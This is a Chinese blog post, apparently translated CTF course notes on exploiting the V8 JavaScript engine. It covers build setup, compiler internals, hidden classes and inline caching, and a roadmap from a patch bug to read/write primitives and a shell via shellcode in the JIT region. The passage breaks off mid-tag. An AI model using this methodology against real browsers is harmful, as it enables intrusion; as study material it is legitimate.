      <content type="html"><![CDATA[<h1 id="v8的知识结构"><a href="#v8的知识结构" class="headerlink" title="v8的知识结构"></a>v8的知识结构</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="预先准备"><a href="#预先准备" class="headerlink" title="预先准备"></a>预先准备</h3><ol><li><p>各种依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install binutils python2.7 perl socat git build-essential gdb gdbserver</span><br></pre></td></tr></table></figure></li><li><p>gdb-peda</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/scwuaptx/peda.git ~/peda</span><br><span class="line">git clone https://github.com/scwuaptx/Pwngdb.git ~/Pwngdb</span><br><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br></pre></td></tr></table></figure></li><li><p>环境设置<br>ubuntu16.04 x64<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-06-142104.png" alt=""></p></li></ol><h3 id="使用make的方式去编译v8（2016年当时）"><a href="#使用make的方式去编译v8（2016年当时）" class="headerlink" title="使用make的方式去编译v8（2016年当时）"></a>使用make的方式去编译v8（2016年当时）</h3><ol><li><p>depot_tools准备</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">$ echo &apos;export PATH=$PATH:&quot;/path/to/depot_tools&quot;&apos; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure></li><li><p>v8编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ fetch v8 &amp;&amp; cd v8$ git reset --hard 6ff5881b1def45b35384572f61327e42563a89c3</span><br><span class="line">$ gclient sync</span><br><span class="line">$ make x64.debug -j 8 # 如果这一步出现问题，就按照下面的方式重新编译</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">$ mv ./third_party/binutils/Linux_x64/Release/bin/ld.gold&#123;,.old&#125;</span><br><span class="line">$ ln -s &#123;/usr,./third_party/binutils/Linux_x64/Release&#125;/bin/ld.gold</span><br><span class="line">$ make x64.debug -j 8</span><br><span class="line"></span><br><span class="line"># instead of using symbloic link, you can use the following line (thank ishita for helping</span><br><span class="line">$ GYP_DEFINES=&quot;werror= linux_use_bundled_binutils=0 linux_use_bundled_gold=0&quot; make x64.debug -j8</span><br></pre></td></tr></table></figure></li></ol><p><strong>/path/to/根据你自己的环境替换。</strong></p><ol><li>启动<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./out/x64.debug/d8</span><br><span class="line">$ ./out/x64.debug/shell</span><br></pre></td></tr></table></figure></li></ol><h3 id="使用ninja的方式去编译v8（2018现在）"><a href="#使用ninja的方式去编译v8（2018现在）" class="headerlink" title="使用ninja的方式去编译v8（2018现在）"></a>使用ninja的方式去编译v8（2018现在）</h3><ol><li>depot_tools准备<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">$ echo &apos;export PATH=$PATH:&quot;/path/to/depot_tools&quot;&apos; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure></li></ol><p><strong>/path/to/根据你自己的环境替换。</strong></p><ol><li><p>ninja准备</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/ninja-build/ninja.git</span><br><span class="line">$ cd ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; cd ..</span><br><span class="line">$ echo &apos;export PATH=$PATH:&quot;/path/to/ninja&quot;&apos; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure></li><li><p>v8编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ fetch v8 &amp;&amp; cd v8&amp;&amp; gclient sync</span><br><span class="line">$ tools/dev/v8gen.py x64.debug</span><br><span class="line">$ ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure></li><li><p>启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./out/x64.debug/d8</span><br><span class="line">$ ./out/x64.debug/shell</span><br></pre></td></tr></table></figure></li></ol><h2 id="关于js的问题"><a href="#关于js的问题" class="headerlink" title="关于js的问题"></a>关于js的问题</h2><h3 id="js引擎"><a href="#js引擎" class="headerlink" title="js引擎"></a>js引擎</h3><p>世界上有各类的js引擎，比较有名的有下面这几种。</p><p>浏览器 渲染引擎 js引擎</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-06-144220.png" alt=""><br>其他的js引擎介绍可以在这里找到：<br><a href="https://blog.sessionstack.com/how-javascript-works-inside-the-v8-engine-5-tips-on-how-to-write-optimized-code-ac089e62b12e" target="_blank" rel="noopener">https://blog.sessionstack.com/how-javascript-works-inside-the-v8-engine-5-tips-on-how-to-write-optimized-code-ac089e62b12e</a></p><h3 id="js的pattern分为两类"><a href="#js的pattern分为两类" class="headerlink" title="js的pattern分为两类"></a>js的pattern分为两类</h3><ol><li>由patch引入的更多pattern<br>了解如何利用由patch所引发的新漏洞，用js来编写exp</li><li>过去的CVE<br>编译有漏洞的源码<br>在上一次和下一次commit之间找到正确的patch<br>有些情况下，PoC(attack code)会随着commit一起发布。<br>从修补程序中找出漏洞，并参考公开可用的PoC进行编写exp</li></ol><p>今天我们将解决pattern 1，但是它和解决pattern 2要做的是相似的。</p><h3 id="攻略方法"><a href="#攻略方法" class="headerlink" title="攻略方法"></a>攻略方法</h3><ol><li>创建一个用于调试的js环境版本<br>如果有一个包含漏洞的patch，hit和build它。</li><li>分析patch以确定哪个patch适用于哪个进程<br> Full-Codegen, Crankshaft, TurboFan, Ignition, AST, IC, …<br> Full-Codegen and Crankshaft do not exist in V8 as of 2018 (see below)</li><li>编写利用漏洞的js代码段<br> Think JavaScript code that causes patched parts to pass and causes bugs</li><li>创建一个任意地址读/写的原语<br> 主要使用ArrayBuffer和TypedArray</li><li>getshell<br> 由于这是Pwn类别的问题，getshell是第一目标。<br> 在JIT区域嵌入shell代码经常被使用</li></ol><p>今天的主题1是如何阅读v8和给出一些编写js exp的建议。<br>今天的主题2是我将介绍getshell的通用技术。</p><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-06-154107.png" alt=""><br>问题出现在当时的v8，已经和现在大不相同。</p><ul><li>当时: Full-Codegen(JIT生成) + Crankshaft(优化1) + TurboFan(优化2)</li><li>现在: Ignition(JIT生成) + TurboFan(优化）</li></ul><p>然而对这个bug的学习依然有用。</p><p>要完成这个目标，我们需要掌握以下知识：</p><ol><li>编译器优化<br>触发optimize的条件</li><li>GC（垃圾回收）<br>GC的实现和触发条件</li><li>了解V8的内存结构和类型表示<br>Integer value, double value, pointer, character string, special value, array, ArrayBuffer, etc.</li></ol><p>供参考的exp:<br><a href="https://gist.github.com/sroettger/d077d3907999aaa0f89d11d956b438ea" target="_blank" rel="noopener">https://gist.github.com/sroettger/d077d3907999aaa0f89d11d956b438ea</a><br><a href="https://rzhou.org/~ricky/pctf2016/js_sandbox.js" target="_blank" rel="noopener">https://rzhou.org/~ricky/pctf2016/js_sandbox.js</a></p><h2 id="什么是v8？"><a href="#什么是v8？" class="headerlink" title="什么是v8？"></a>什么是v8？</h2><p>解释和执行js的引擎<br>由c++实现，parse js代码，构造AST<br>基于AST，JIT将其编译成汇编执行。</p><p>AST：a+b<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-06-161022.png" alt=""></p><p>在做v8 exp之前，首先我们需要知道v8的结构（你不需要知道所有的结构，因为它更新很快……）<br>但是你必须了解基本的概念。</p><p>在了解了这些之后，你就可以从Exploit的观点去深入</p><ul><li>如何实现任意地址读写？</li><li>如何稳定的利用？</li></ul><p>注意，我们主要讲解2016年4月的v8的结构，如果你想了解现在的v8，下面这些资料是十分有用的。<br><a href="https://www.slideshare.net/ssuser6f246f/v8-javascript-engine-for" target="_blank" rel="noopener">https://www.slideshare.net/ssuser6f246f/v8-javascript-engine-for</a><br><a href="https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine" target="_blank" rel="noopener">https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine</a></p><h2 id="v8的编译器和优化"><a href="#v8的编译器和优化" class="headerlink" title="v8的编译器和优化"></a>v8的编译器和优化</h2><h3 id="编译器的种类"><a href="#编译器的种类" class="headerlink" title="编译器的种类"></a>编译器的种类</h3><p>要理解v8，其中最重要的组件就是编译器。<br>内部大概分成四个编译器<br>旧的baseline编译器：Full-Codegen<br>旧的优化编译器：Crankshaft<br>新的优化编译器：TurboFan<br>新的baseline编译器：Ignition<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-06-162728.png" alt=""></p><p>下面这些资料可以用于参考：<br><a href="https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/edit#slide=id.p" target="_blank" rel="noopener">An overview of the TurboFan compiler</a><br><a href="https://docs.google.com/presentation/d/1_eLlVzcj94_G4r9j9d_Lj5HRKFnq6jgpuPJtnmIBs88" target="_blank" rel="noopener">TurboFan: A new code generation architecture for V8</a></p><h3 id="编译器的历史"><a href="#编译器的历史" class="headerlink" title="编译器的历史"></a>编译器的历史</h3><p>最初，Full-Codegen直接生成和执行汇编语言<br>从AST直接生成汇编语言代码（JIT）相对较快，但是生成的汇编语言代码有很多冗杂部分，还有优化空间。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-07-025035.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-140512.png" alt=""></p><p>2010年，用于优化hot-code的Crankshaft被引入。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-07-025306.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-140547.png" alt=""></p><p>2015年，又引入了TurboFan，为了更好的适应新的javascript规范。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-07-030317.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-140712.png" alt=""></p><p>2017年，引入了生成中间语言(bytecode)的Ignition<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-07-030943.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-140742.png" alt=""></p><p>2018年至今，Full-Codegen和Crankshaft已经被从v8中移除。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-07-031037.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-140755.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-140822.png" alt=""></p><h3 id="今天的问题"><a href="#今天的问题" class="headerlink" title="今天的问题~"></a>今天的问题~</h3><p>2016年当时的latest<br>Hidden Class和Inline Caching也用作优化。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-07-032813.png" alt=""></p><h3 id="编译器和优化"><a href="#编译器和优化" class="headerlink" title="编译器和优化"></a>编译器和优化</h3><ul><li>baseline编译器<br>1.Full-Codegen 重要度低—&gt;对于理解这个exp的重要性</li><li>优化机制<br>2.Hidden Class 重要度中—&gt;更准确的说，Hidden Class是一种有助于自身加速的机制，而Inline Caching是一种基于Hidden Class信息进行优化的机制。<br>3.Inline Caching 重要度中</li><li>优化编译器<br>4.Crankshaft 重要度低<br>5.TurboFan 重要度高</li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-07-041132.png" alt=""><br>（顺便说一下）你应该知道的其他部分<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-07-041214.png" alt=""><br>api.cc、api.h：如果你想集成v8到你自己的程序，可以使用这里的API。<br>compiler/、compiler.cc、compiler.hh：编译起点是src/compiler.cc（从src/api.cc调用）<br>globals.h:常量和其他的定义<br>heap：GC<br>ic：Inline Caching<br>objects-ini.h、objects.cc、objects.h、type.cc、type.h: V8中使用的对象和类型的定义</p><h3 id="Full-Codegen"><a href="#Full-Codegen" class="headerlink" title="Full-Codegen"></a>Full-Codegen</h3><p>Full-Codegen中存在的机制：</p><ul><li>将AST转换为汇编语言<ul><li>它是一个JIT编译器<ul><li>JIT编译器：一种在软件执行时进行编译并提高执行速度的机制</li><li>通过它，v8把要执行的JavaScript代码转换为机器语言</li></ul></li><li>机器语言输出位于JIT区域（= RWX区域）<ul><li>将EIP寄存器移到这个JIT区域并按原样继续执行</li></ul></li><li>它尚未优化</li></ul></li></ul><p>它是一种与当前问题没有太大关系，并且不存在于最新代码中的机制，因此省略了细节</p><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><ul><li>Full-Codegen生成的机器语言特性（半优化代码）<ul><li>生成速度快，但执行速度慢（造成浪费）</li></ul></li><li><p>因此，使用了根据需要来进行优化的机制</p><ul><li><p>优化1：缓存使用情况</p><ul><li>使用Hidden Class和Inline Caching<ul><li>缓存要调用的地址和要引用的偏移量</li></ul></li></ul></li><li><p>优化2：重新编译为更高效的JIT代码</p><ul><li>优化目标是在运行时确定的<ul><li>在主线程中，正常执行机器语言</li><li>在另一个线程中，Runtime-Profiler测量使用状态<ul><li>Runtime-Profiler：在程序执行时测量和统计执行状态的机制</li><li>根据测量结果判断是否优化</li></ul></li></ul></li><li>使用Crankshaft进行优化编译<ul><li>再次将源编译为机器语言，并将正在运行的机器语言替换掉</li></ul></li><li>使用TurboFan优化编译<ul><li>再次将源编译为机器语言，并将正在运行的机器语言替换掉</li></ul></li></ul></li></ul></li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-07-060921.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-07-061031.png" alt=""></p><h2 id="Hiddern-Class"><a href="#Hiddern-Class" class="headerlink" title="Hiddern Class"></a>Hiddern Class</h2><ol><li>每个property的值都以数组的形式进行管理。</li><li>通过偏移值访问数组里的property值</li></ol><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-07-123753.png" alt=""></p><p>偏移值被分开管理<br>将属性名称和偏移量的依赖关系保留给另一个类(Map类)<br>这个Map类被称作Hidden Class</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-07-124009.png" alt=""></p><h3 id="Map生成"><a href="#Map生成" class="headerlink" title="Map生成"></a>Map生成</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-07-124545.png" alt=""><br>①创建object的时刻（还没有property时），obj1内部指向C0<br>②创建一个没有property的map，type+offset管理，通常被称作C0<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-07-125133.png" alt=""><br>①当你添加obj1.x的时候，改变obj1内部指向C1<br>②通过向C0添加x的offset信息来创建新的map C1（map也有类型信息）<br>③在C0中添加转换条件<br>Map:C0<br>条件：当x加入时转移到C1</p><p>当访问obj1.x的值时，跟踪obj1所持有的指针，并引用C1以获取“x的偏移量为0”的信息。之后，通过访问obj 1的偏移量0处的值，可以高速的获得x的值。在C1内部，有必要寻找“x”，尽管我个人觉得它与哈希表似乎没有多大区别，但是这会让它更快。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-07-130350.png" alt=""><br>①当你添加obj1.y的时候，obj1在内部更改为指向C2<br>②通过向C1添加y的offset信息来创建新的map C2<br>③在C1中添加转换条件<br>条件：添加y时，转换到C2</p><p>此时C0和C1不再使用，但它们不会被移除，因为它们可能在将来被重新使用。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-07-130848.png" alt=""><br>对于具有完全相同属性的对象，如果你创建类似的对象，自然存在“x”和“y”，你可以使用创建的Map。<br>创建obj 2的时刻指向C0，但通过以与obj 1相同的方式按x和y的顺序添加属性，它遵循转换条件以完成C0-&gt;C1-&gt;C2<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-07-131159.png" alt=""><br><strong>注意：如果属性添加顺序不同，即使具有相同名称的属性的对象也将具有不同的转换条件。 因此，最终创建的map也会变成不同的map，并且无法获得加速的好处。<br>有关详细信息，请参阅<br><a href="http://richardartoul.github.io/jekyll/update/2015/04/26/hidden-classes.html" target="_blank" rel="noopener">http://richardartoul.github.io/jekyll/update/2015/04/26/hidden-classes.html</a><br>另外，如果property添加/删除次数增加太多，Hidden Class的管理会减慢。<br>因此，此时它不使用Hidden Class，而使用字典类型来管理<br><a href="https://v8project.blogspot.jp/2017/08/fast-properties.html" target="_blank" rel="noopener">https://v8project.blogspot.jp/2017/08/fast-properties.html</a></strong></p><h3 id="property的管理方法"><a href="#property的管理方法" class="headerlink" title="property的管理方法"></a>property的管理方法</h3><p>1.默认情况下,object的内部管理是通过array实现的</p><ul><li>In-Object property（这次的解说就是用这种方法）</li></ul><p>2.当property增加到11个以上，使用外部的array来管理。</p><ul><li>Fast property</li></ul><p>3.如果再进一步增加property，那么就用object外的dictory来管理</p><ul><li>slow/dict properties<ul><li>它也被称为self-contained，因为没有使用map且使用外部的dictory保存所有的信息</li><li>尽管实体是一个FixedArray的数组，但它被用作如下所示的字典<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-08-131813.png" alt=""></li></ul></li></ul><p>参考资料：<a href="https://v8project.blogspot.jp/2017/08/fast-properties.html" target="_blank" rel="noopener">https://v8project.blogspot.jp/2017/08/fast-properties.html</a></p><h3 id="我想在这里说的"><a href="#我想在这里说的" class="headerlink" title="我想在这里说的"></a>我想在这里说的</h3><ol><li>一个object(javascript中)有一个指向Map的指针<ul><li>正如我们稍后会看到的，object的前8个字节是一个指向Map的指针</li></ul></li><li>(JavaScript)object指向的map将根据状况改变<ul><li>在漏洞利用中，这不是一个可靠的指针</li></ul></li><li>相同的类型=Map的地址是相同的<ul><li>比较map的地址即可确定类型是否一致</li></ul></li></ol><h2 id="Inline-Caching"><a href="#Inline-Caching" class="headerlink" title="Inline Caching"></a>Inline Caching</h2><p>参考资料：</p><ul><li><a href="https://blog.ghaiklor.com/optimizations-tricks-in-v8-d284b6c8b183" target="_blank" rel="noopener">https://blog.ghaiklor.com/optimizations-tricks-in-v8-d284b6c8b183</a></li><li><a href="https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine" target="_blank" rel="noopener">https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine</a></li><li><a href="https://www.slideshare.net/ssuser6f246f/v8-javascript-engine-for" target="_blank" rel="noopener">https://www.slideshare.net/ssuser6f246f/v8-javascript-engine-for</a></li><li><a href="http://cs.au.dk/~jmi/VM/IC-V8.pdf" target="_blank" rel="noopener">http://cs.au.dk/~jmi/VM/IC-V8.pdf</a></li></ul><p>附注：其中部分我做了翻译，可以在这里找到</p><ul><li><a href="http://eternalsakura13.com/2018/06/16/nodefest_v8/">http://eternalsakura13.com/2018/06/16/nodefest_v8/</a></li></ul><h3 id="对于各个action，对类型进行缓存和优化的机制"><a href="#对于各个action，对类型进行缓存和优化的机制" class="headerlink" title="对于各个action，对类型进行缓存和优化的机制"></a>对于各个action，对类型进行缓存和优化的机制</h3><ol><li>这里所说的action可以表示下列任意一种<pre><code>- 参照，代入（LoadIC, StoreIC)- 数组访问（KeyedLoadIC，KeyedStoreIC）- 二项演算 (BinaryOpIC）**最近的V8中被去掉了？**- 函数调用（CallIC）- 比较（CompareIC)- 布尔化(ToBooleanIC) **最近的V8中被去掉了？**</code></pre></li><li>某些action的jit code被多次调用时需要考虑的<ul><li>循环和函数多次传递相同的JIT code</li></ul></li><li>在执行JIT代码时着眼于操作目标的类型（≒参数）<ul><li>JIT code很可能与上次通过时的操作类型相同</li><li>例如，以下JavaScript代码显示重复相同类型的操作<ul><li>即使对应每个JIT代码，这个推断也应该保持不变<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (var i=<span class="number">0</span>;</span><br><span class="line">    i&lt;<span class="number">10000</span>;    <span class="comment">// 也许一个integer被从i载入，它是很可能去进行integer和integer的比较</span></span><br><span class="line">    i++)        <span class="comment">// 进行整数相加的可能性很大，i可能用一个整数去代替</span></span><br><span class="line">&#123;</span><br><span class="line">    var j =        <span class="comment">// j可能是被赋值为整数</span></span><br><span class="line">            <span class="number">100</span>*i; <span class="comment">// 也许一个整数会从i加载，它是很可能去进行整数相乘</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ol><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-08-135721.png" alt=""></p><ol><li><p>JavaScript类型=map地址</p><ul><li>从Hidden Class实现中可以看到，如果是相同类型，那么Map地址是相同的。</li><li>缓存类型意味着将map地址嵌入到JIT code中</li><li>例如，加载obj.x时的IC具有以下image<ul><li>将x的偏移值一起缓存</li><li>当map匹配时，直接由缓存的x的偏移值得到property x的值，并返回。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    mov  ecx, &quot;x&quot;</span><br><span class="line">    mov  eax, obj</span><br><span class="line">    cmp  [eax + kMapOffset], &lt;被缓存的map地址&gt;</span><br><span class="line">    jne  MISS</span><br><span class="line">    mov  eax, [eax + kPropertiesOffset]</span><br><span class="line">    mov  eax, [eax + 被缓存的&quot;x&quot;（通过hidden class获得）的offset]</span><br><span class="line">    jmp  DONE</span><br><span class="line">MISS:</span><br><span class="line">    call IC_Miss// 抄近路失败，根据本来的code来获得&quot;x&quot;的offset</span><br><span class="line">DONE:</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>实际上，由于有多个Map被注册的情况，所以需要进行函数化<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-08-142505.png" alt=""><br>箭头1：当第二个map被注册时<br>箭头2：当第三个map被注册时</p></li><li><p>IC[存储了/持有]State</p><ul><li>UNINITIALIZED(0): 未初始化</li><li>PREMONOMORPHIC(.): 只被执行一次的情况，还没进行IC</li><li>MONOMORPHIC(1): IC注册一个的状态（快速）</li><li>POLYMORPHIC(P): IC注册两个以上的状态（一般的快）</li><li>MEGAMORPHIC(N): IC注册多个的状态</li><li>GENERIC(G):IC已停止的状态<br><strong>括号里是对于之后所说的debug输出（–trace-ic）的省略的标注</strong></li><li>基本上是从上到下进行迁移的(0-&gt;.-&gt;1-&gt;P-&gt;N-&gt;G)<ul><li>有些直接从0→1，如CallIC等</li></ul></li></ul></li><li>Inline Caching可通过-trace-ic进行确认<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-08-143709.png" alt=""></li><li>使用–use-ic启用IC（默认），使用–no-use-ic禁用</li></ol><h3 id="关于inline-caching"><a href="#关于inline-caching" class="headerlink" title="关于inline caching"></a>关于inline caching</h3><p>到目前为止说过的东西：</p><ul><li>它与Hidden Class配对，对hign speed有很大的贡献</li><li>但是在exploit观点，只需缓存在JIT中的地址和偏移量即可</li><li>由于很难创建任意地址读/写的原语，因此与exploit的兼容性不是很好</li><li>但是，有些情况下应该部分简化IC检查（例如边界检查）<ul><li>因此，在非IC下不会引发的漏洞可能会在IC下触发</li></ul></li></ul><h2 id="优化-1"><a href="#优化-1" class="headerlink" title="优化"></a>优化</h2><h3 id="Crankshaft和TurboFan"><a href="#Crankshaft和TurboFan" class="headerlink" title="Crankshaft和TurboFan"></a>Crankshaft和TurboFan</h3><p>两种编译器都可以用于优化</p><ul><li><p>如何调用优化</p><ul><li>hot-code，也就是说，它是一个多次调用的函数或循环<ul><li>优化由函数单元或循环单元执行</li><li>与主线程中并行执行，runtime-profiler在另一个线程中计数并作出判断</li><li>它也取决于函数和循环的代码段大小，但如果调用大约1000次或10000次左右，它将成为优化目标<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;<span class="comment">// hot-code(都有成为hot-code的可能性)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (var i=<span class="number">0</span>; i&lt;<span class="number">10000</span>; i++) &#123;</span><br><span class="line">    func(); <span class="comment">// hot-code(都有成为hot-code的可能性)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>被判断为hot-code的话</p><ul><li>turbofan/crankshart会在其他线程里再次编译（hot-code的）所属区域（的代码）<ul><li>但是，hot-code不被最优化的情况也是存在的</li></ul></li><li>通过替换机器语言的jmp目标地址（在主线程中执行）来切换以执行优化的机器语言，</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">将函数切换为优化代码时，可以将指针更新为函数对象的JIT区域</span><br><span class="line"><span class="function">function <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;<span class="comment">// hot-code(都有成为hot-code的可能性)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (var i=<span class="number">0</span>; i&lt;<span class="number">10000</span>; i++) &#123;</span><br><span class="line">    func(); <span class="comment">// hot-code(都有成为hot-code的可能性)</span></span><br><span class="line">&#125;</span><br><span class="line">在循环中，当从中间切换到优化代码时，可以将jmp目标切换到循环的顶部，但仍然存在名为OSR（On-Stack-Replacement）的切换方法。</span><br><span class="line">但这里省略，参考这篇文章：https:<span class="comment">//wingolog.org/archives/2011/06/20/on-stack-replacement-in-v8）</span></span><br></pre></td></tr></table></figure><ul><li>最优化编译器的使用条件（主要的）<ol><li>未优化的语法不在函数/循环中使用<ul><li>debugger语句，eval语句，等等</li></ul></li><li>如果有“use asm”语句，则使用TurboFan<ul><li>只有TurboFan可以优化asm.js</li></ul></li><li>如果有Crankshaft不支持的语法，则将使用TurboFan<ul><li>try catch，with等</li></ul></li><li>Crankshaft被默认使用<ul><li>这是2016年的情况，现在Crankshaft被移除。</li></ul></li></ol></li></ul><h3 id="Crankshaft"><a href="#Crankshaft" class="headerlink" title="Crankshaft"></a>Crankshaft</h3><p>Crankshaft的特点</p><ul><li>Type-feeback<ul><li>通过使用runtime-profiler收集的信息，确定类型来加快速度</li><li>最终生成的优化代码包含一个类型检查</li><li>当它不能确定类型时，它将返回到优化前的代码。</li></ul></li><li>Hydrogen (optimization by high-level intermediate representation (HIR))<ul><li>AST以SSA格式表示</li><li>各种优化，比如将loop内部不变的变量移到loop外。</li></ul></li><li>lithium（Optimization by Low-Level Intermediate Representation (LIR)）<ul><li>快速的寄存器分配算法</li><li>依赖CPU的优化，code生成</li></ul></li></ul><p><strong>因为，它是一种与当前问题没有太大关系并且不存在于最新代码中的机制，因此省略了细节。<br>如果需要了解细节，可以参考这篇文章：<a href="http://nothingcosmos.github.io/V8Crankshaft/src/blog.html" target="_blank" rel="noopener">http://nothingcosmos.github.io/V8Crankshaft/src/blog.html</a></strong></p><h3 id="TurboFan"><a href="#TurboFan" class="headerlink" title="TurboFan"></a>TurboFan</h3><p>参考资料：<br><a href="https://github.com/v8/v8/wiki/TurboFan" target="_blank" rel="noopener">https://github.com/v8/v8/wiki/TurboFan</a><br><a href="https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine" target="_blank" rel="noopener">https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine</a><br><a href="https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/edit#slide=id.p" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/edit#slide=id.p</a></p><h4 id="TurboFan全览"><a href="#TurboFan全览" class="headerlink" title="TurboFan全览"></a>TurboFan全览</h4><p>下图显示了截至2018年TurboFan的整体情况<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-012951.png" alt=""><br><img 